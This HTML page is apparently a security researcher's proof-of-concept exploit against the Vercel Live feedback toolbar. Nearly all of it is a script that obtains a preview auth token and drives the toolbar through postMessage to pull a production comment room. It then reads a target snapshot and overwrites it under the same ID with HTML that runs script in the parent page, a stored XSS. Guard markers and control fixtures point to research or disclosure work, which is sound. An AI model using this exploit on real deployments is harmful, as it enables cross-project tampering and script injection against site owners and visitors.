<!doctype html>
<script>
(() => {
  const LIVE_ORIGIN = 'https://vercel.live';
  const PRODUCTION_HOST =
    'naturell-toolbar-fork-victim-20260809-h763y6e4f-testteam22-687d.vercel.app';
  const PROJECT_ID = 'prj_eg3xiAzg9rqF1tLFbXOkCwpftLJO';
  const OWNER_ID = 'team_qmp53qfzAPgwkguhRzHvSwgV';
  const OWNER_SLUG = 'testteam22-687d';
  const PRODUCTION_BRANCH = 'main';
  const PRODUCTION_ROOM_SHA256 =
    'f637935f61809b35a7dc4b92f6067a8081399f4808dbda429bb00f60ef53130a';
  const CONTROL_THREAD_PREFIX = 'naturell-production-control-thread-';
  const CONTROL_THREAD_PATTERN =
    /^naturell-production-control-thread-[0-9a-f]{16}$/;
  const CONTROL_PAGE_TITLE = 'Naturell normalized mutation control';
  const CONTROL_SNAPSHOT_HTML =
    '<!doctype html><meta charset="utf-8"><title>Naturell mutation control</title><p>Naturell synthetic mutation control</p>';
  const requestedMarker = new URLSearchParams(location.search).get('marker');
  const DOM_MARKER =
    /^naturell_external_fork_snapshot_overwrite_xss_[0-9a-f]{24}$/.test(
      requestedMarker || ''
    ) ? requestedMarker : null;
  const SOURCE_MARKER =
    'naturell_external_fork_snapshot_overwrite_source_20260810';
  const PROJECT_STAGE =
    new URLSearchParams(location.search).get('stage') === 'project';
  const PREVIEW_AUTH_KEY =
    'naturell-external-fork-preview-toolbar-authenticated';
  const CONTROL_SNAPSHOT_ID_PATTERN = /^naturell-control-[0-9a-f]{24}$/;

  let vercelAuthJWE = null;
  let originalSnapshotText = null;
  let replacementSnapshotText = null;

  const state = window.__naturellSnapshotOverwrite = {
    sourceMarker: SOURCE_MARKER,
    domMarker: DOM_MARKER,
    phase: 'bootstrap',
    authStage: PROJECT_STAGE ? 'project' : 'preview',
    previewAuthAccepted:
      sessionStorage.getItem(PREVIEW_AUTH_KEY) === '1',
    toolbarReady: false,
    initAccepted: false,
    projectMatched: false,
    productionSession: false,
    roomMatched: false,
    pullAccepted: false,
    exactTargetCount: 0,
    targetSelected: false,
    originalSnapshotRead: false,
    originalSnapshotMatched: false,
    snapshotIdValidated: false,
    uploadAccepted: false,
    returnedKeyMatched: false,
    replacementRead: false,
    originalBytesChanged: false,
    replacementBytesMatched: false,
    navigationSent: false,
    originalSnapshotSha256: null,
    replacementSnapshotSha256: null,
    targetThreadSha256: null,
    targetSnapshotKeySha256: null,
    target: null,
    targets: [],
    roomId: null,
    roomKey: null,
    ownerSlug: null,
    targetThreadId: null,
    targetSnapshotKey: null,
    targetSnapshotId: null,
    pullReplyId: null,
    originalGetReplyId: null,
    uploadReplyId: null,
    replacementGetReplyId: null,
  };

  function randomHex(byteCount) {
    const bytes = new Uint8Array(byteCount);
    crypto.getRandomValues(bytes);
    return Array.from(bytes, byte =>
      byte.toString(16).padStart(2, '0')
    ).join('');
  }

  async function sha256Text(value) {
    const bytes = new TextEncoder().encode(value);
    const digest = await crypto.subtle.digest('SHA-256', bytes);
    return Array.from(new Uint8Array(digest), byte =>
      byte.toString(16).padStart(2, '0')
    ).join('');
  }

  function safeState() {
    return {
      sourceMarker: state.sourceMarker,
      domMarker: state.domMarker,
      phase: state.phase,
      authStage: state.authStage,
      previewAuthAccepted: state.previewAuthAccepted,
      toolbarReady: state.toolbarReady,
      initAccepted: state.initAccepted,
      projectMatched: state.projectMatched,
      productionSession: state.productionSession,
      roomMatched: state.roomMatched,
      pullAccepted: state.pullAccepted,
      exactTargetCount: state.exactTargetCount,
      targetSelected: state.targetSelected,
      originalSnapshotRead: state.originalSnapshotRead,
      originalSnapshotMatched: state.originalSnapshotMatched,
      snapshotIdValidated: state.snapshotIdValidated,
      uploadAccepted: state.uploadAccepted,
      returnedKeyMatched: state.returnedKeyMatched,
      replacementRead: state.replacementRead,
      originalBytesChanged: state.originalBytesChanged,
      replacementBytesMatched: state.replacementBytesMatched,
      navigationSent: state.navigationSent,
      originalSnapshotSha256: state.originalSnapshotSha256,
      replacementSnapshotSha256: state.replacementSnapshotSha256,
      targetThreadSha256: state.targetThreadSha256,
      targetSnapshotKeySha256: state.targetSnapshotKeySha256,
    };
  }

  function setPhase(phase) {
    state.phase = phase;
    document.documentElement.dataset.snapshotOverwritePhase = phase;
    window.name = `naturell-snapshot-overwrite:${JSON.stringify(safeState())}`;
  }

  function loadToolbar() {
    const script = document.createElement('script');
    script.async = true;
    script.dataset.explicitOptIn = 'true';
    script.src = 'https://vercel.live/_next-live/feedback/feedback.js';
    document.head.append(script);
  }

  async function prepareToolbar() {
    if (!DOM_MARKER) {
      setPhase('proof-marker-invalid');
      return;
    }
    if (PROJECT_STAGE && !state.previewAuthAccepted) {
      setPhase('project-stage-without-preview-auth');
      return;
    }
    if (!PROJECT_STAGE) {
      setPhase('preview-jwe-fetching');
      try {
        const response = await fetch('/.well-known/vercel/jwe', {
          credentials: 'include',
          cache: 'no-store',
        });
        if (response.status === 200) vercelAuthJWE = await response.text();
      } catch {}
      if (!vercelAuthJWE) {
        setPhase('preview-jwe-unavailable');
        return;
      }
    }
    setPhase('waiting-for-toolbar-ready');
    loadToolbar();
  }

  function send(type, replyId, payload) {
    state.target.postMessage({type, replyId, payload}, LIVE_ORIGIN);
  }

  function pullProductionRoom() {
    const profileId = `p${randomHex(16)}`;
    const clientId = crypto.randomUUID();
    const requestNonce = randomHex(4);
    state.pullReplyId = `naturell-overwrite-pull-${randomHex(8)}`;
    setPhase('production-room-pull-sent');
    send('pull', state.pullReplyId, {
      roomId: state.roomId,
      body: JSON.stringify({
        profileID: profileId,
        clientID: clientId,
        cookie: null,
        lastMutationID: 0,
        pullVersion: 0,
        schemaVersion: '',
      }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Replicache-RequestID': `${clientId}-${requestNonce}-0`,
      },
    });
  }

  function activeSnapshotHtml() {
    return `<!doctype html>
<meta charset="utf-8">
<title>Naturell external fork snapshot overwrite proof</title>
<p>${DOM_MARKER}</p>
<scr${''}ipt>
(() => {
  const marker = ${JSON.stringify(DOM_MARKER)};
  const source = ${JSON.stringify(SOURCE_MARKER)};
  const fixtureNode = parent.document.querySelector('#marker');
  const valueRead = fixtureNode ? fixtureNode.textContent : '';
  parent.document.documentElement.setAttribute(
    'data-naturell-external-fork-snapshot-overwrite-xss', marker
  );
  parent.document.documentElement.setAttribute(
    'data-naturell-external-fork-snapshot-overwrite-read', valueRead
  );
  parent.document.documentElement.setAttribute(
    'data-naturell-external-fork-snapshot-overwrite-source', source
  );
  if (fixtureNode) fixtureNode.textContent = marker;
  parent.postMessage({
    type: 'naturell-external-fork-snapshot-overwrite-marker',
    marker,
    source,
    valueRead,
  }, '*');
})();
<\/scr${''}ipt>`;
  }

  async function acceptProductionPull(result) {
    const patch = result?.body?.patch;
    state.pullAccepted = result?.init?.status === 200 && Array.isArray(patch);
    if (!state.pullAccepted) {
      setPhase('production-room-pull-rejected');
      return;
    }

    const keyPrefix =
      `/3/${state.ownerSlug}/${PROJECT_ID}/${state.roomKey}/snapshot/`;
    const matches = patch.map(item => {
      if (item?.op !== 'put' || !item.value) return false;
      const thread = item.value;
      if (!(typeof thread.id === 'string' &&
        thread.id.startsWith(CONTROL_THREAD_PREFIX) &&
        CONTROL_THREAD_PATTERN.test(thread.id) &&
        item.key === `commentThread-${thread.id}` &&
        thread.pageTitle === CONTROL_PAGE_TITLE &&
        typeof thread.snapshotKey === 'string' &&
        thread.snapshotKey.startsWith(keyPrefix))) return null;
      const snapshotId = thread.snapshotKey.slice(keyPrefix.length);
      if (!CONTROL_SNAPSHOT_ID_PATTERN.test(snapshotId)) return null;
      return {thread, snapshotId};
    }).filter(Boolean);
    state.exactTargetCount = matches.length;
    if (matches.length !== 1) {
      setPhase('production-control-thread-not-unique');
      return;
    }

    const {thread, snapshotId} = matches[0];
    state.targetThreadId = thread.id;
    state.targetSnapshotKey = thread.snapshotKey;
    state.targetSnapshotId = snapshotId;
    state.targetThreadSha256 = await sha256Text(thread.id);
    state.targetSnapshotKeySha256 = await sha256Text(thread.snapshotKey);
    state.targetSelected = true;
    state.originalGetReplyId = `naturell-overwrite-get-before-${randomHex(8)}`;
    setPhase('original-snapshot-read-sent');
    send('get-snapshot', state.originalGetReplyId, {
      snapshotKey: state.targetSnapshotKey +
        `?naturellOverwriteVerify=before-${randomHex(8)}`,
    });
  }

  async function acceptOriginalSnapshot(result) {
    const text = result?.text;
    if (typeof text !== 'string' || !text) {
      setPhase('original-snapshot-read-rejected');
      return;
    }
    originalSnapshotText = text;
    state.originalSnapshotRead = true;
    state.originalSnapshotSha256 = await sha256Text(text);
    if (text !== CONTROL_SNAPSHOT_HTML) {
      setPhase('original-snapshot-control-mismatch');
      return;
    }
    state.originalSnapshotMatched = true;

    if (!CONTROL_SNAPSHOT_ID_PATTERN.test(state.targetSnapshotId)) {
      setPhase('snapshot-id-validation-rejected');
      return;
    }
    state.snapshotIdValidated = true;
    replacementSnapshotText = activeSnapshotHtml();
    state.replacementSnapshotSha256 = await sha256Text(replacementSnapshotText);
    if (state.originalSnapshotSha256 === state.replacementSnapshotSha256) {
      setPhase('replacement-payload-not-distinct');
      return;
    }

    state.uploadReplyId = `naturell-overwrite-upload-${randomHex(8)}`;
    setPhase('same-snapshot-id-upload-sent');
    send('upload-snapshot', state.uploadReplyId, {
      snapshotId: state.targetSnapshotId,
      blob: new Blob([replacementSnapshotText], {type: 'text/html'}),
    });
  }

  function acceptUpload(result) {
    const returnedKey = result?.id;
    if (typeof returnedKey !== 'string') {
      setPhase('same-snapshot-id-upload-rejected');
      return;
    }
    state.uploadAccepted = true;
    state.returnedKeyMatched = returnedKey === state.targetSnapshotKey;
    if (!state.returnedKeyMatched) {
      setPhase('upload-returned-different-snapshot-key');
      return;
    }
    state.replacementGetReplyId =
      `naturell-overwrite-get-after-${randomHex(8)}`;
    setPhase('replacement-snapshot-read-sent');
    setTimeout(() => send('get-snapshot', state.replacementGetReplyId, {
      snapshotKey: state.targetSnapshotKey +
        `?naturellOverwriteVerify=${randomHex(8)}`,
    }), 300);
  }

  async function acceptReplacementSnapshot(result) {
    const text = result?.text;
    if (typeof text !== 'string') {
      setPhase('replacement-snapshot-read-rejected');
      return;
    }
    state.replacementRead = true;
    const actualHash = await sha256Text(text);
    state.originalBytesChanged = actualHash !== state.originalSnapshotSha256;
    state.replacementBytesMatched =
      text === replacementSnapshotText &&
      actualHash === state.replacementSnapshotSha256;
    if (!state.originalBytesChanged || !state.replacementBytesMatched) {
      setPhase('original-snapshot-key-not-replaced');
      return;
    }

    state.navigationSent = true;
    setPhase('production-navigation-sent');
    const destination = new URL(`https://${PRODUCTION_HOST}/`);
    destination.searchParams.set('vercelThreadId', state.targetThreadId);
    destination.searchParams.set('deliverySource', SOURCE_MARKER);
    destination.searchParams.set('proofMarker', DOM_MARKER);
    location.replace(destination.href);
  }

  addEventListener('message', async event => {
    if (event.origin !== LIVE_ORIGIN || !event.data) return;

    try {
      if (event.data.type === 'ready' && event.source) {
        if (state.targets.includes(event.source)) return;
        state.targets.push(event.source);
        state.toolbarReady = true;
        setPhase('toolbar-init-sent');
        event.source.postMessage({
          type: 'preview-origin',
          previewOrigin: window.origin,
          path: window.location.pathname + window.location.search,
        }, LIVE_ORIGIN);
        const authOptions = PROJECT_STAGE ? {
          projectId: PROJECT_ID,
          ownerId: OWNER_ID,
          branch: PRODUCTION_BRANCH,
        } : {
          hostname: location.hostname,
          deploymentId: '',
          path: '/',
          vercelAuthJWE,
        };
        event.source.postMessage({
          type: 'init',
          authOptions,
          origin: LIVE_ORIGIN,
          page: '/',
        }, LIVE_ORIGIN);
        return;
      }

      if (
        event.data.type === 'init-reply' &&
        state.targets.includes(event.source) &&
        !state.initAccepted
      ) {
        const session = event.data.existingAuth?.session;
        state.projectMatched = session?.projectId === PROJECT_ID;
        if (!session || !state.projectMatched || !session.roomId) return;

        if (!PROJECT_STAGE) {
          if (session.deploymentTarget !== 'preview') return;
          state.initAccepted = true;
          state.previewAuthAccepted = true;
          sessionStorage.setItem(PREVIEW_AUTH_KEY, '1');
          setPhase('preview-authenticated-reload');
          const next = new URL(location.href);
          next.searchParams.set('stage', 'project');
          next.searchParams.set('delivery', 'snapshot-overwrite');
          location.replace(next.href);
          return;
        }

        state.productionSession = session.deploymentTarget === 'production';
        const scopeMatched =
          session.ownerSlug === OWNER_SLUG &&
          session.roomKey === PRODUCTION_BRANCH;
        const roomHash = await sha256Text(session.roomId);
        state.roomMatched = roomHash === PRODUCTION_ROOM_SHA256;
        if (!state.productionSession || !state.roomMatched || !scopeMatched) {
          return;
        }

        state.target = event.source;
        state.roomId = session.roomId;
        state.ownerSlug = session.ownerSlug;
        state.roomKey = session.roomKey;
        state.initAccepted = true;
        setPhase('production-project-session-accepted');
        pullProductionRoom();
        return;
      }

      if (
        event.data.type !== 'live-frame-reply' ||
        event.source !== state.target ||
        !event.data.id
      ) return;

      if (event.data.id === state.pullReplyId) {
        if (event.data.error) {
          setPhase('production-room-pull-rejected');
          return;
        }
        await acceptProductionPull(event.data.result);
        return;
      }

      if (event.data.id === state.originalGetReplyId) {
        if (event.data.error) {
          setPhase('original-snapshot-read-rejected');
          return;
        }
        await acceptOriginalSnapshot(event.data.result);
        return;
      }

      if (event.data.id === state.uploadReplyId) {
        if (event.data.error) {
          setPhase('same-snapshot-id-upload-rejected');
          return;
        }
        acceptUpload(event.data.result);
        return;
      }

      if (event.data.id === state.replacementGetReplyId) {
        if (event.data.error) {
          setPhase('replacement-snapshot-read-rejected');
          return;
        }
        await acceptReplacementSnapshot(event.data.result);
      }
    } catch {
      setPhase('snapshot-overwrite-script-error');
    }
  });

  setTimeout(() => {
    if (!state.navigationSent) setPhase('snapshot-overwrite-timeout');
  }, 60000);
  prepareToolbar();
})();
</script>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

  <p>Naturell synthetic external fork fixture</p>
